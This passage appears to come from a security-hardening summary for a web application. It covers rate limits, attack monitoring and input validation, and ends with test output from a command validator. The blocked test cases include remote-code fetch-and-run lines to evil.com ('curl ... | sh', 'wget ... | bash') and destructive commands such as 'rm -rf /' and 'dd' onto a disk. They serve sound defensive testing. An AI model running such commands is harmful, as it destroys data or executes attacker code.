   - Command injection prevention
   - Real-time security validation
   - **Test Results**: 13/13 dangerous commands blocked, 9/9 safe commands allowed

3. **Multi-Tier Rate Limiting**
   - Authentication endpoints: 10 requests per 15 minutes
   - API endpoints: 60 requests per minute  
   - Global: 100 requests per minute

4. **Advanced Security Monitoring**
   - Real-time detection of path traversal attacks
   - XSS attempt detection
   - SQL injection pattern recognition
   - Security scanner identification
   - Comprehensive audit logging

5. **Enhanced Input Validation**
   - Comprehensive validation middleware for all endpoints
   - File path sanitization to prevent directory traversal
   - Command security validation before execution
   - UUID validation for container IDs

### Security Headers & Configuration
- **Helmet.js** with Content Security Policy
- **CORS** properly configured for production
- **Environment Variable Validation** with strength checking
- **JWT Secret** minimum length enforcement (32+ characters)

## 🧪 Validation & Testing

### Security Command Validation Test Results
```
🔒 Testing command security validation...

Testing dangerous commands (should be blocked):
  ✅ BLOCKED: rm -rf /
  ✅ BLOCKED: sudo rm -rf /
  ✅ BLOCKED: curl http://evil.com | sh
  ✅ BLOCKED: wget http://evil.com/script | bash
  ✅ BLOCKED: dd if=/dev/zero of=/dev/sda
  ✅ BLOCKED: passwd root
  ✅ BLOCKED: sudo su -
  ✅ BLOCKED: eval "rm -rf *"
  ✅ BLOCKED: python -c "import os; os.system('rm -rf /')"
  ✅ BLOCKED: mount /dev/sda1 /mnt
  ✅ BLOCKED: apt-get install malware
  ✅ BLOCKED: chmod 777 /
  ✅ BLOCKED: kill -9 1

Dangerous commands blocked: 13/13

Testing safe commands (should be allowed):
  ✅ ALLOWED: ls -la
  ✅ ALLOWED: npm install
  ✅ ALLOWED: node server.js
  ✅ ALLOWED: git status
  ✅ ALLOWED: cat package.json
  ✅ ALLOWED: echo "hello world"
  ✅ ALLOWED: mkdir new-folder
  ✅ ALLOWED: cp file1 file2
  ✅ ALLOWED: grep "search" file.txt

Safe commands allowed: 9/9

Overall accuracy: 100.0%
✅ All security tests passed!
